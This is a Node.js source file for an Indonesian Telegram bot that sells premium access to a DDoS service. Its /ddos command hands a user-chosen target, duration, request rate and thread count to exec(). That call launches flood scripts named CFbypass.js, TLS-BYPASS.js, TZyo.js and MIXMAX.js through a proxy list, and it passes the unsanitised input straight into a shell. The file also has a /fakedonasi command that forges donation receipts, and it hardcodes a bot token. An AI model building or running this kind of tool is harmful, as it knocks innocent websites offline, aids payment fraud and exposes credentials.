const request = require('request');
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const { Telegraf } = require('telegraf');
const { Markup } = require('telegraf');
const express = require('express');
const fs = require('fs');
const { exec } = require('child_process');

const token = '6756607698:AAFXC7yBL0BhhOII7asZ3cGXgk12ebXfXOY';
const bot = new TelegramBot(token, {polling: true});
const adminId = '6620511265'; // ID admin, ganti dengan 
const premiumUserDB = './premiumUsers.json';


// Fungsi untuk memeriksa apakah pengguna adalah pengguna premium
function isPremiumUser(userId) {
  // Mengambil data dari file JSON
  const rawData = fs.readFileSync(premiumUserDB);
  const premiumUsers = JSON.parse(rawData);

  if (premiumUsers.includes(userId)) {
    return true; // Pengguna adalah pengguna premium
  } else {
    return false; // Pengguna adalah non-premium
  }
}

bot.onText(/\/clonebot (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const requestedToken = match[1];

  if (isPremiumUser(userId)) {
    // Lakukan proses cloning bot di sini menggunakan requestedToken
    bot.sendMessage(chatId, 'Proses cloning bot sedang berjalan...');
  } else {
    bot.sendMessage(chatId, 'Maaf, fitur cloning hanya dapat diakses oleh pengguna premium.');
  }
});

// Load premium users from database
if (fs.existsSync(premiumUserDB)) {
  const data = fs.readFileSync(premiumUserDB);
  premiumUsers = JSON.parse(data);
}

// Function to save premium users to database
const savePremiumUsers = () => {
  fs.writeFileSync(premiumUserDB, JSON.stringify(premiumUsers));
}

// Function to check if user is admin
const isAdmin = (userId) => {
  return userId.toString() === adminId;
}

// Function to add premium user
const addPremiumUser = (userId) => {
  premiumUsers.push(userId);
  savePremiumUsers();
}

// Function to remove premium user
const removePremiumUser = (userId) => {
  const index = premiumUsers.indexOf(userId);
  if (index > -1) {
    premiumUsers.splice(index, 1);
    savePremiumUsers();
  }
}

// Command: /addprem iduser
bot.onText(/\/addprem (.+)/, (msg, match) => {
  const userId = match[1];
  if (isAdmin(msg.from.id)) {
    addPremiumUser(userId);
    bot.sendMessage(msg.chat.id, `User ${userId} has been added to premium users.`);
  } else {
    bot.sendMessage(msg.chat.id, 'Only admin can add premium users.');
  }
});

// Command: /delprem iduser
bot.onText(/\/delprem (.+)/, (msg, match) => {
  const userId = match[1];
  if (isAdmin(msg.from.id)) {
    removePremiumUser(userId);
    bot.sendMessage(msg.chat.id, `User ${userId} has been removed from premium users.`);
  } else {
    bot.sendMessage(msg.chat.id, 'Only admin can remove premium users.');
  }
});

//create user tools ddos
bot.onText(/\/createuser (.+) (.+)/, (msg, match) => {
  const userId = msg.from.id; // Get user ID
  if (userId.toString() === adminId) { // Check if the user is admin
    const username = match[1];
    const password = match[2];
    const url = `https://infogame-epep.000webhostapp.com/process.php?username=${username}&password=${password}&create`;
    const button = {
      text: 'Click disini',
      url: url
    }
    bot.sendMessage(msg.chat.id, 'Klik link di bawah untuk Bikin Username Baru:', {
      reply_markup: {
        inline_keyboard: [
          [button]
        ]
      }
    });
  } else {
    bot.sendMessage(msg.chat.id, 'Maaf, hanya admin yang bisa melakukan operasi ini.');
  }
});

//create user tools ddos

bot.onText(/\/createuser (.+) (.+)/, (msg, match) => {
  const userId = msg.from.id; // Get user ID
  if (userId === 6721761178) { // Check if the user is admin
    const username = match[1];
    const password = match[2];
    const url = `https://infogame-epep.000webhostapp.com/process.php?username=${username}&password=${password}&create`;
    const button = createButton('Click disini', url);
    bot.sendMessage(msg.chat.id, 'Klik link di bawah untuk Bikin Username Baru:', {
      reply_markup: {
        inline_keyboard: [
          [button]
        ]
      }
    });
  } else {
    bot.sendMessage(msg.chat.id, 'Maaf, hanya admin yang bisa melakukan operasi ini.');
  }
});

bot.onText(/\/deleteuser (.+)/, (msg, match) => {
  const userId = msg.from.id; // Get user ID
  if (userId === 6899193114) { // Check if the user is admin
    const username = match[1];
    const url = `https://infogame-epep.000webhostapp.com/process.php?delete=&usernameToDelete=${username}`;
    const button = createButton('Click disini', url);
    bot.sendMessage(msg.chat.id, 'Klik link di bawah untuk Hapus Username Baru:', {
      reply_markup: {
        inline_keyboard: [
          [button]
        ]
      }
    });
  } else {
    bot.sendMessage(msg.chat.id, 'Maaf, hanya admin yang bisa melakukan operasi ini.');
  }
});


// Menampilkan menu bot 
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id; 
  bot.sendMessage(chatId, " *BERIKUT MENU BOT DYCODERS* \n\n" +
    "/start - untuk memulai bot\n" +
    "/grup - untuk melihat grup\n" +
    "/aksesprem - untuk melihat list premium\n" +
    "/DDOSMENU - cara pake bot ddos nya\n\n" +
    " *OWNERBOT ADA ID BAWAH INI* ",
    {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'CONTACT', url: 'https://t.me/dycoders' }
          ]
        ]
      },
      parse_mode: "Markdown"
    }
  );
});
//menu chenel 
bot.onText(/\/grup/, (msg) => {
  const chatId = msg.chat.id;

  // Menampilkan chenel
  bot.sendMessage(chatId, "grup bot saya di bawah ini",
    {
      reply_markup: {
        inline_keyboard: [
          [
            { text: '❗ Grup❗', url: 'https://t.me/botbydycoders' }
          ]
        ]
      },
      parse_mode: "Markdown"
    }
  );
});
//menu ddos
//menu addprem

// Event handling untuk perintah /myprem
bot.onText(/\/ddosmenu/, (msg) => {
    try {
        const data = fs.readFileSync('premiumUsers.json', 'utf8');
        const premiumUsers = new Set(JSON.parse(data)); // Baca data premiumUsers dari file JSON

        if (premiumUsers.has(msg.from.id.toString())) {
            bot.sendMessage(msg.chat.id, 'hai, ' + (msg.from.username || 'Unknown') + ' cara pake bot ddos nya gini\n1./ddos web 60 64 5\n2./http web\n\nCONTOH\n1./ddos https://skarti.vpn-store.my.id 60 64 5\n2./http https://skarti.vpn-store.my.id\n\nFUNGSI /ddos adalah untuk down web / ddos web nya\nFUNGSI /http adalah untuk cek host / cek ke down / ddos atau gak', {
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: 'Beli Premium', 
                            url: 'https://t.me/dycoders'
                        }]
                    ]
                }
            });
        } else {
            bot.sendMessage(msg.chat.id, 'hai ' + (msg.from.username || 'Unknown') + '\nmaaf tidak bisa karena kamu belum menjadi user premium, mau jadi user premium?, bisa beli / sewa di saya admin @dycoders', {
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: 'Beli Premium',
                            url: 'https://t.me/dycoders'
                        }]
                    ]
                }
            });
        }
    } catch (err) {
        console.error('Error reading premiumUsers data', err.message);
        bot.sendMessage(msg.chat.id, 'Terjadi kesalahan saat memeriksa status premium.');
    }
});

// Fungsi untuk menyimpan data premiumUsers ke dalam file JSON
function savePremiumUsersToFile(data) {
    fs.writeFile('premiumUsers.json', JSON.stringify(Array.from(data)), 'utf8', (err) => {
        if (err) {
            console.error('Error writing premiumUsers data', err.message);
        }
    });
}

// Inisialisasi bot
const MAX_MESSAGES_BEFORE_CLEAR_PROMPT = 15;
let messageCount = 0;

bot.onText(/\/clear/, (msg) => {
  const chatId = msg.chat.id;

  if (messageCount < MAX_MESSAGES_BEFORE_CLEAR_PROMPT) {
    // Menghapus riwayat obrolan bot dengan pengguna
    bot.deleteMessage(chatId, msg.message_id)
      .then(() => {
        messageCount++;
        bot.sendMessage(chatId, 'Riwayat obrolan Anda telah dihapus.');
      })
      .catch((error) => {
        console.error('Error deleting message:', error);
        bot.sendMessage(chatId, 'Maaf, terjadi kesalahan dalam menghapus riwayat obrolan.');
      });
  } else {
    bot.sendMessage(chatId, 'Anda telah menggunakan bot ini sebanyak 15 kali. Mohon bersihkan riwayat chat Anda sendiri untuk melanjutkan penggunaan bot.');
  }
});


// Fungsi untuk memeriksa apakah pengguna adalah pengguna premium
function isPremiumUser(userId) {
  // Mengambil data dari file JSON
  const rawData = fs.readFileSync('premiumUsers.json');
  const premiumUsers = JSON.parse(rawData);

  if (premiumUsers.includes(userId)) {
    return true; // Pengguna adalah pengguna premium
  } else {
    return false; // Pengguna adalah non-premium
  }
}

bot.onText(/\/cekprem (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const requestedUserId = match[1];

  if (isPremiumUser(requestedUserId)) {
    bot.sendMessage(chatId, 'ID ' + requestedUserId + ' adalah pengguna premium. 🌟🌟🌟');
  } else {
    bot.sendMessage(chatId, 'ID ' + requestedUserId + ' adalah pengguna non-premium. ⭐');
  }
});

// Fitur /cekid - Cek User ID Telegram Dari Username

//donasi
bot.onText(/\/donasi/, (msg) => {
    const saweriaLink = 'https://saweria.co/Garzz';
    const buttonOptions = {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: 'Donasi ke Saya', url: 'https://telegra.ph/file/c3fc2aee8f687efc7e6af.jpg' }
                ]
            ]
        }
    };
    const donasiMessage = `Terima kasih telah mendukung kami melalui donasi! Jika Anda ingin memberikan donasi, silakan klik button dibawah ini 🤗`;

    bot.sendMessage(msg.chat.id, donasiMessage, buttonOptions);
});

const donasiData = {
    pesan: 'BOT BERHASIL DIAKTIFKAN \ud83e\udd17'
};

// Kemudian kirim pesan donasi yang berisi data donasi:
bot.sendMessage(adminId, `NAMA: ${donasiData.namaUser}\nID: ${donasiData.userId}\nNAMA: ${donasiData.username}\nPESAN: ${donasiData.pesan}`);

bot.onText(/\/fakedonasi (.+) (.+) (.+) (.+) (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const nama = match[1];
  const gmail = match[2];
  const uang = match[3];
  const pesan = match[4];
  const lanjut = match[5];

  const waktu = new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" });
  const id = generateUUID();

  const donasiMessage = `Donasi Baru Diterima! 🎉\n\nWaktu: ${waktu}\nID: ${id}\nTipe: donation\nTotal: Rp ${uang}\nPotongan: -3750\nNama Pengirim: ${nama}\nEmail Pengirim: ${gmail}\nPesan: ${pesan} ${lanjut}`;

  const keyboard = [
    [{
      text: "Donasi Juga",
      url: "https://telegra.ph/file/c3fc2aee8f687efc7e6af.jpg"
    }]
  ];

  const messageOptions = {
    reply_markup: JSON.stringify({
      inline_keyboard: keyboard
    })
  };

  bot.sendMessage(chatId, donasiMessage, messageOptions)
    .then(() => {
      bot.sendMessage(chatId, "Pesan donasi berhasil dikirim");
    })
    .catch((error) => {
      bot.sendMessage(chatId, "Gagal mengirim pesan donasi");
    });
});

function generateUUID() {
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
    var r = Math.random() * 16 | 0,
      v = c === 'x' ? r : (r & 0x3 | 0x8);
    return v.toString(16);
  });
}

//menu chekhost
function createButton(text, url) {
  return {
    text: text,
    url: url
  };
}

//menu chekhost
bot.onText(/\/ping (.+)/, (msg, match) => {
  const web = match[1];
  const url = `https://check-host.net/check-ping?host=${web}&`;
  const button = createButton('Click disini', url);
  bot.sendMessage(msg.chat.id, 'Klik link di bawah untuk melihat hasil:', {
    reply_markup: {
      inline_keyboard: [
        [button]
      ]
    }
  });
});

bot.onText(/\/http (.+)/, (msg, match) => {
  const web = match[1];
  const url = `https://check-host.net/check-http?host=${web}&csrf_token=`;
  const button = createButton('Click disini', url);
  bot.sendMessage(msg.chat.id, 'Klik link di bawah untuk melihat hasil:', {
    reply_markup: {
      inline_keyboard: [
        [button]
      ]
    }
  });
});

bot.onText(/\/info (.+)/, (msg, match) => {
  const web = match[1];
  const url = `https://check-host.net/ip-info?host=${web}`;
  const button = createButton('Click disini', url);
  bot.sendMessage(msg.chat.id, 'Klik link di bawah untuk melihat hasil:', {
    reply_markup: {
      inline_keyboard: [
        [button]
      ]
    }
  });
});

bot.onText(/\/dns (.+)/, (msg, match) => {
  const web = match[1];
  const url = `https://check-host.net/check-dns?host=${web}&csrf_token=`;
  const button = createButton('Click disini', url);
  bot.sendMessage(msg.chat.id, 'Klik link di bawah untuk melihat hasil:', {
    reply_markup: {
      inline_keyboard: [
        [button]
      ]
    }
  });
});

//menu ddos
bot.onText(/\/itools/, (msg) => {
    try {
        const data = fs.readFileSync('premiumUsers.json', 'utf8');
        const premiumUsers = new Set(JSON.parse(data)); // Baca data premiumUsers dari file JSON

        if (premiumUsers.has(msg.from.id.toString())) {
            bot.sendMessage(msg.chat.id, 'HALLO, ' + (msg.from.username || 'Unknown') + 'Masukan Tools kalian', {
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: 'Beli Premium',
                            url: 'https://t.me/farzpemulaa'
                        }]
                    ]
                }
            });
        } else {
            bot.sendMessage(msg.chat.id, 'Hallo ' + (msg.from.username || 'Unknown') + '\nJika Anda belum menjadi anggota premium, jangan khawatir! Anda juga dapat menikmati pengalaman yang luar biasa dengan mengupgrade ke keanggotaan premium kami. Silakan hubungi @dycoders untuk informasi lebih lanjut. 🎭\nTerima kasih atas perhatian dan selamat bergabung dengan komunitas premium kami! 💥\n\n#PremiumMember #ExclusiveExperience #JoinTheCommunity', {
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: 'Beli Premium',
                            url: 'https://t.me/dycoders'
                        }]
                    ]
                }
            });
        }
    } catch (err) {
        console.error('Error reading premiumUsers data', err.message);
        bot.sendMessage(msg.chat.id, 'Terjadi kesalahan saat memeriksa status premium.');
    }
});
//menu stop
bot.onText(/\/stop/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (isPremiumUser(userId)) {
    // Hentikan file yang sedang berjalan
    exec("pkill -f CFbypass.js");
    exec("pkill -f TLS-BYPASS.js");
    exec("pkill -f MIXMAX.js");
    exec("pkill -f TZyo.js");
   
    bot.sendMessage(chatId, 'Berhasil menghentikan file yang sedang berjalan.');
  } else {
    bot.sendMessage(chatId, 'Maaf, hanya pengguna premium yang dapat menggunakan perintah ini.');
  }
});

//menu crash
try {
  const data = fs.readFileSync('premiumUsers.json', 'utf8');
  const premiumUsers = new Set(JSON.parse(data)); // Baca data premiumUsers dari file JSON

  //menu crash
  bot.onText(/\/ddos (.+) (.+) (.+) (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (isPremiumUser(userId)) {
      const web = match[1];
      const time = match[2];
      const req = match[3];
      const thread = match[4];

      // Menjalankan script Crash1.js dengan parameter yang diberikan
      exec(`node CFbypass.js ${web} ${time}`, (error, stdout, stderr) => {
        if (error) {
          bot.sendMessage(chatId, `Error: ${error.message}`);
          return;
        }
        if (stderr) {
          bot.sendMessage(chatId, `Error: ${stderr}`);
          return;
        }
        bot.sendMessage(chatId, `Success\n\nTarget: ${web},\nTime: ${time},\nReq: ${req},\nThread: ${thread}`);
      });

      // Menjalankan script Crash2.js dengan parameter yang diberikan
      exec(`node TLS-BYPASS.js ${web} ${time} ${req} ${thread}`, (error, stdout, stderr) => {
        if (error) {
          bot.sendMessage(chatId, `Error: ${error.message}`);
          return;
        }
        if (stderr) {
          bot.sendMessage(chatId, `Error: ${stderr}`);
          return;
        }
        bot.sendMessage(chatId, `Success\n\nTarget: ${web},\nTime: ${time},\nReq: ${req},\nThread: ${thread}`);
      });
      
exec(`node TZyo.js ${web} ${time} ${req} ${thread}`, (error, stdout, stderr) => {

        if (error) {

          bot.sendMessage(chatId, `Error: ${error.message}`);
          return;
        }
        if (stderr) {
          bot.sendMessage(chatId, `Error: ${stderr}`);
          return;
        }
        bot.sendMessage(chatId, `Success\n\nTarget: ${web},\nTime: ${time},\nReq: ${req},\nThread: ${thread}`);
      });
      // Menjalankan script Crash3.js dengan parameter yang diberikan
      exec(`node MIXMAX.js ${web} ${time} ${req} ${thread} proxy6.txt`, (error, stdout, stderr) => {
        if (error) {
          bot.sendMessage(chatId, `Error: ${error.message}`);
          return;
        }
        if (stderr) {
          bot.sendMessage(chatId, `Error: ${stderr}`);
          return;
        }
        bot.sendMessage(chatId, `Success\n\nTarget: ${web},\nTime: ${time},\nReq: ${req},\nThread: ${thread}`);
      });
    } else {
      bot.sendMessage(chatId, 'Maaf, hanya pengguna premium yang dapat menggunakan perintah ini.');
    }
  });

  function isPremiumUser(userId) {
    // Cek apakah userId ada di dalam premiumUsers
    return premiumUsers.has(userId.toString());
  }

  // Jalankan bot
  bot.startPolling();
} catch (error) {
  console.error('Error:', error);
}